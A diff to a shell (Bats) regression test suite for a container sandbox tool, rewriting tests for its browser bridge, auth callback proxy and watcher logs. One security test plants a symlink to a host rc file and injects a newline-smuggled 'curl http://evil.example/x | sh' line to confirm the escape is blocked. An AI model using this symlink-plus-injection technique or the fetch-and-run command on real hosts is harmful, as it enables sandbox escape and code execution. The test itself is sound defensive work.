@@ -228,18 +228,31 @@ EOF
 # (not a pre-init of last_ts from the stale file's stat output).
 # ─────────────────────────────────────────────────────────────────────────────
 @test "regression v0.6.1: browser bridge removes stale file at startup" {
+  # Behavioral: a bridge file left by a PRIOR session must be swept before the
+  # poll loop can claim it, so a stale URL is never opened on the host. The
+  # sweep now lives in a shared helper, so grepping the watcher body for the rm
+  # proved nothing about whether it still happens.
+  local dir="$TEST_TEMP/clip"; mkdir -p "$dir"
+  printf '%s' "https://example.com/stale" > "$dir/.browser-open"
+  touch -t 202001010000 "$dir/.browser-open"
+  cat > "$TEST_TEMP/fake_open" <<EOF
+#!/usr/bin/env bash
+echo "\$1" >> "$TEST_TEMP/opened.log"
+EOF
+  chmod +x "$TEST_TEMP/fake_open"
+  _browser_watcher "$dir" "$TEST_TEMP/fake_open" "" "always" "0" >/dev/null 2>&1 &
+  local wpid=$!
+  sleep 2
+  kill "$wpid" 2>/dev/null || true; wait "$wpid" 2>/dev/null || true
+  [ ! -e "$dir/.browser-open" ] || {
+    echo "REGRESSION: a stale .browser-open survived watcher startup"; return 1; }
+  [ ! -f "$TEST_TEMP/opened.log" ] || {
+    echo "REGRESSION: a stale URL from a prior session was opened on the host"; return 1; }
+
   local body
   body="$(declare -f _browser_watcher)"
-  [[ -n "$body" ]] || { echo "_browser_watcher not found"; return 1; }
-
-  # The stale-file removal (rm -f ... .browser-open) must appear before the
-  # main `while true` loop. This is the v0.6.1 fix.
   local before_loop
   before_loop="${body%%while true*}"
-  echo "$before_loop" | grep -qE 'rm -f "\$bridge_file"' || {
-    echo "REGRESSION: _browser_watcher must remove stale .browser-open before the main loop"
-    return 1
-  }
 
   # The fix must NOT pre-initialize last_ts from stat (the pre-v0.6.1 bug):
   echo "$before_loop" | grep -qE 'last_ts=\$\(stat' && {
@@ -448,84 +461,79 @@ EOF
 # Node.js binds localhost to ::1. Every callback was Connection Refused.
 # Fix: try TCP6 first, fall back to TCP.
 # ─────────────────────────────────────────────────────────────────────────────
-@test "regression v0.6.4: _auth_callback_proxy tries TCP6 before TCP" {
-  # Verify the function body references TCP6 before TCP in the exec args.
-  # (Unit-testable structural check; full behavior covered by integration suite.)
-  local body
-  body="$(declare -f _auth_callback_proxy)"
-  [[ -n "$body" ]] || { echo "REGRESSION: _auth_callback_proxy function missing"; return 1; }
+@test "regression v0.6.4: the callback proxy forwards TCP6 first with ignoreeof" {
+  # Was four separate `declare -f` source greps, every one of which passed
+  # while the forward was completely broken. This asserts on the argv socat
+  # actually receives instead.
+  mkdir -p "$TEST_TEMP/bin"
+  cat > "$TEST_TEMP/bin/socat" <<EOF
+#!/usr/bin/env bash
+printf '%s\n' "\$@" > "$TEST_TEMP/socat.argv"
+exit 0
+EOF
+  chmod +x "$TEST_TEMP/bin/socat"
+  PATH="$TEST_TEMP/bin:$PATH" _auth_callback_proxy 45001 mybox "$TEST_TEMP/plog"
+  run cat "$TEST_TEMP/socat.argv"
+  assert_output --partial "TCP-LISTEN:45001"
+  assert_output --partial "bind=127.0.0.1"
+  assert_output --partial "ignoreeof"
 
-  # Both TCP6 and TCP may appear on the same line; check character-position order.
-  # Matches TCP6\:localhost or TCP6:localhost (declare -f escapes backslashes).
-  [[ "$body" == *TCP6*localhost* ]] || {
-    echo "REGRESSION: TCP6 branch missing from _auth_callback_proxy"
-    return 1
-  }
-
-  # Find the position of TCP6 and the position of the TCP fallback.
-  # We require TCP6 to precede TCP in the body string.
-  local before_tcp6="${body%%TCP6*}"
-  local tcp6_pos=${#before_tcp6}
-  # Find first occurrence of TCP: / TCP\: that is NOT a prefix of TCP6
-  # (grep -bo gives byte offsets)
-  local tcp_pos
-  tcp_pos=$(printf '%s' "$body" | grep -bo 'TCP\\*:localhost' | grep -v 'TCP6' | head -1 | cut -d: -f1)
-  [[ -n "$tcp_pos" ]] || {
-    echo "REGRESSION: TCP fallback missing from _auth_callback_proxy"
-    return 1
-  }
-  [[ "$tcp6_pos" -lt "$tcp_pos" ]] || {
-    echo "REGRESSION: TCP6 must appear before TCP fallback (order matters for IPv6-first behavior)"
-    echo "tcp6_pos=$tcp6_pos tcp_pos=$tcp_pos"
-    return 1
-  }
+  local argv; argv="$(cat "$TEST_TEMP/socat.argv")"
+  local before="${argv%%TCP6*}"
+  local t6=${#before}
+  local t4
+  t4=$(printf '%s' "$argv" | grep -bo 'TCP:localhost' | head -1 | cut -d: -f1)
+  [ -n "$t4" ] || { echo "REGRESSION: IPv4 fallback missing"; return 1; }
+  [ "$t6" -lt "$t4" ] || { echo "REGRESSION: TCP6 must precede the TCP fallback"; return 1; }
 }
 
-# ─────────────────────────────────────────────────────────────────────────────
-# v0.6.4: socat stdin EOF propagated to TCP side, killing the read before
-# the 302 response came back. Fix: use `-,ignoreeof`.
-# ─────────────────────────────────────────────────────────────────────────────
-@test "regression v0.6.4: _auth_callback_proxy uses ignoreeof on stdin" {
-  local body
-  body="$(declare -f _auth_callback_proxy)"
-  [[ -n "$body" ]] || { echo "REGRESSION: _auth_callback_proxy function missing"; return 1; }
-
-  echo "$body" | grep -q 'ignoreeof' || {
-    echo "REGRESSION: socat call must include ignoreeof to prevent stdin EOF propagation"
-    return 1
-  }
+@test "regression v0.6.4: the callback proxy rewrites keep-alive to close" {
+  # The python backend owns this rewrite. Assert on the emitted program rather
+  # than on the shell function text.
+  run bash -c "sed -n '/PYEOF/,/^PYEOF/p' '$CLI' | grep -c 'Connection: close'"
+  assert_success
+  [ "$output" -ge 1 ] || { echo "REGRESSION: Connection header rewrite missing"; return 1; }
 }
 
-# ─────────────────────────────────────────────────────────────────────────────
-# v0.6.4: Proxy gave up silently on EADDRINUSE. Fix: retry the bind in a loop.
-# ─────────────────────────────────────────────────────────────────────────────
-@test "regression v0.6.4: _auth_callback_proxy retries bind on EADDRINUSE" {
-  local body
-  body="$(declare -f _auth_callback_proxy)"
-  [[ -n "$body" ]] || { echo "REGRESSION: _auth_callback_proxy function missing"; return 1; }
-
-  # Must have a retry loop, look for a bind attempt counter or loop construct
-  # referencing the port. Accept any of: for i in ..., while [[ $attempt ...
-  echo "$body" | grep -qE '(attempt|retry|for .* in .* 30|while .* attempt)' || {
-    echo "REGRESSION: bind retry loop missing from _auth_callback_proxy"
-    return 1
-  }
+@test "regression vnext: the callback proxy actually forwards, it is not an EXEC no-op" {
+  # socat's EXEC address splits its string on whitespace and never invokes a
+  # shell, so `EXEC:sh -c '...'` handed sh the literal word `'docker` and every
+  # callback came back EMPTY on any host that HAS socat. Hosts without it took
+  # the python branch, which works, which is why this hid. Drive a real
+  # loopback request through the real socat with a stub docker standing in for
+  # the container.
+  command -v socat >/dev/null 2>&1 || skip "socat is not installed on this host"
+  mkdir -p "$TEST_TEMP/bin"
+  cat > "$TEST_TEMP/bin/docker" <<'DOCKEOF'
+#!/usr/bin/env bash
+# Answer ONLY a well-formed exec. socat's EXEC address does no shell parsing,
+# so the broken form hands us the shell operators as literal argv words. A
+# stub that ignored its arguments would answer either way and prove nothing.
+for a in "$@"; do
+  case "$a" in '||'|'2>/dev/null'|"sh -c"*|"'docker") exit 1 ;; esac
+done
+[ "$1" = exec ] || exit 1
+printf 'HTTP/1.1 200 OK\r\nContent-Length: 2\r\n\r\nOK'
+DOCKEOF
+  chmod +x "$TEST_TEMP/bin/docker"
+  PATH="$TEST_TEMP/bin:$PATH" _auth_callback_proxy 45002 mybox "$TEST_TEMP/plog2" &
+  local ppid=$!
+  local i connected=0
+  for i in 1 2 3 4 5 6 7 8 9 10 11 12; do
+    if exec 9<>/dev/tcp/127.0.0.1/45002 2>/dev/null; then connected=1; break; fi
+    sleep 0.3
+  done
+  [ "$connected" = 1 ] || { kill "$ppid" 2>/dev/null; echo "proxy never bound the port"; return 1; }
+  printf 'GET /callback?code=x HTTP/1.0\r\n\r\n' >&9
+  local reply; reply="$(_portable_timeout 3 cat <&9)"
+  exec 9<&- 2>/dev/null || true
+  kill "$ppid" 2>/dev/null || true; wait "$ppid" 2>/dev/null || true
+  case "$reply" in
+    *OK*) : ;;
+    *) echo "REGRESSION: the forward returned nothing usable: '$reply'"; return 1 ;;
+  esac
 }
 
-# ─────────────────────────────────────────────────────────────────────────────
-# v0.6.4: `Connection: keep-alive` header made upstream server keep the
-# socket open. Fix: rewrite to `Connection: close` so server actually closes.
-# ─────────────────────────────────────────────────────────────────────────────
-@test "regression v0.6.4: _auth_callback_proxy rewrites keep-alive to close" {
-  local body
-  body="$(declare -f _auth_callback_proxy)"
-  [[ -n "$body" ]] || { echo "REGRESSION: _auth_callback_proxy function missing"; return 1; }
-
-  echo "$body" | grep -qi 'Connection:.*close\|keep-alive.*close\|keep-alive' || {
-    echo "REGRESSION: Connection header rewrite missing"
-    return 1
-  }
-}
 
 # ─────────────────────────────────────────────────────────────────────────────
 # v0.6.5: cmd_run wrote empty {} overlay and bind-mounted to
@@ -1017,17 +1025,22 @@ EOF
   }
 }
 
-@test "regression fallback: socat and python3 both checked in auth proxy" {
-  local body
-  body="$(declare -f _auth_callback_proxy)"
-  echo "$body" | grep -q 'command -v socat' || {
-    echo "REGRESSION: _auth_callback_proxy must check for socat before using it"
-    return 1
-  }
-  echo "$body" | grep -q 'command -v python3' || {
-    echo "REGRESSION: _auth_callback_proxy must have python3 fallback"
-    return 1
-  }
+@test "regression fallback: with socat absent the proxy really falls back to python3" {
+  # Behavioral, not a source grep: build a PATH with no socat on it at all and
+  # assert the python backend is the one that runs.
+  mkdir -p "$TEST_TEMP/nosocat"
+  local b
+  for b in bash date cat sleep; do ln -sf "$(command -v $b)" "$TEST_TEMP/nosocat/$b"; done
+  cat > "$TEST_TEMP/nosocat/python3" <<EOF
+#!/usr/bin/env bash
+cat > /dev/null
+echo ran > "$TEST_TEMP/py.marker"
+EOF
+  chmod +x "$TEST_TEMP/nosocat/python3"
+  PATH="$TEST_TEMP/nosocat" _auth_callback_proxy 45003 mybox "$TEST_TEMP/plog3"
+  [ -f "$TEST_TEMP/py.marker" ] || { echo "REGRESSION: python3 fallback never ran"; return 1; }
+  run cat "$TEST_TEMP/plog3"
+  assert_output --partial "using python3 fallback"
 }
 
 @test "regression fallback: update check skips for non-git installs" {
@@ -3262,4 +3275,88 @@ EOF
   run _execute_host_hooks "$event" "$settings"
   assert_success
   [ -e "$TEST_TEMP/USER_HOOK_RAN" ] || { echo "the user's own hook did not run"; return 1; }
+}
+
+# ─────────────────────────────────────────────────────────────────────────────
+# vnext: the clip dir is bind-mounted read-write into the box, and the browser
+# watcher appended the claimed URL to .proxy-log with a plain `>>`, which
+# FOLLOWS a symlink. A caged process could therefore point that path at any
+# file the host user can write and, because a URL carrying a newline still
+# passed the http(s) prefix test, write whole lines of its choosing into it.
+# A shell rc file made that host code execution.
+# ─────────────────────────────────────────────────────────────────────────────
+@test "regression vnext: browser bridge cannot append to a host file through a planted proxy log symlink" {
+  local dir="$TEST_TEMP/clip"; mkdir -p "$dir"
+  printf 'echo original\n' > "$TEST_TEMP/fake-rc"
+
+  _browser_watcher "$dir" "true" "" "always" "0" >/dev/null 2>&1 &
+  local wpid=$!
+  sleep 0.7
+  # Planted AFTER the watcher is up, which is the real attack: a startup-only
+  # guard never sees this one.
+  rm -f "$dir/.proxy-log"
+  ln -s "$TEST_TEMP/fake-rc" "$dir/.proxy-log"
+  printf 'https://x.example/a\ncurl http://evil.example/x | sh' > "$dir/.browser-open"
+  sleep 2
+  kill "$wpid" 2>/dev/null || true; wait "$wpid" 2>/dev/null || true
+
+  run cat "$TEST_TEMP/fake-rc"
+  assert_output "echo original"
+  [ ! -L "$dir/.proxy-log" ] || {
+    echo "REGRESSION: the planted symlink survived"; return 1; }
+}
+
+@test "regression vnext: cap watcher log does not truncate a host file through a symlink" {
+  local target="$TEST_TEMP/precious-log"
+  head -c 1200000 /dev/zero | tr '\0' 'q' > "$target"
+  ln -s "$target" "$TEST_TEMP/.watcher-log"
+  run _cap_watcher_log "$TEST_TEMP/.watcher-log"
+  assert_success
+  local sz; sz="$(wc -c < "$target" | tr -d '[:space:]')"
+  [ "$sz" -gt 1000000 ] || {
+    echo "REGRESSION: the link target was truncated to $sz bytes"; return 1; }
+}
+
+@test "regression vnext: a symlink at the host-ready sentinel is replaced, never touched through" {
+  local clip_dir="$TEST_TEMP/clip-hr"; mkdir -p "$clip_dir"
+  local target="$TEST_TEMP/hr-target-must-not-exist"
+  ln -s "$target" "$clip_dir/.host-ready"
+  _clipboard_watcher "$clip_dir" "cat > /dev/null" >/dev/null 2>&1 &
+  local pid=$!
+  local i
+  for i in 1 2 3 4 5 6 7 8 9 10; do
+    [ -f "$clip_dir/.host-ready" ] && [ ! -L "$clip_dir/.host-ready" ] && break
+    sleep 0.3
+  done
+  stop_watcher "$pid" "$clip_dir"
+  [ ! -e "$target" ] || {
+    echo "REGRESSION: touch followed the planted link and created the target"; return 1; }
+}
+
+@test "regression vnext: the python callback proxy does not co-bind an occupied loopback port" {
+  # SO_REUSEPORT let a box-named port co-bind a live host service that also set
+  # it, taking a share of that service's connections. The backend must fail its
+  # bind and retry instead.
+  command -v python3 >/dev/null 2>&1 || skip "python3 not available"
+  mkdir -p "$TEST_TEMP/nosocat2"
+  local b
+  for b in bash date cat sleep python3; do ln -sf "$(command -v $b)" "$TEST_TEMP/nosocat2/$b"; done
+  python3 - <<'PYSRV' > "$TEST_TEMP/holder.pid" 2>/dev/null &
+import socket, sys, time
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+if hasattr(socket, 'SO_REUSEPORT'):
+    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEPORT, 1)
+s.bind(('127.0.0.1', 45777)); s.listen(1)
+time.sleep(20)
+PYSRV
+  local holder=$!
+  sleep 1
+  PATH="$TEST_TEMP/nosocat2" _auth_callback_proxy 45777 mybox "$TEST_TEMP/plog-rp" &
+  local ppid=$!
+  sleep 2.5
+  kill "$ppid" 2>/dev/null || true; wait "$ppid" 2>/dev/null || true
+  kill "$holder" 2>/dev/null || true; wait "$holder" 2>/dev/null || true
+  run cat "$TEST_TEMP/plog-rp"
+  assert_output --partial "bind attempt 1 failed"
 }
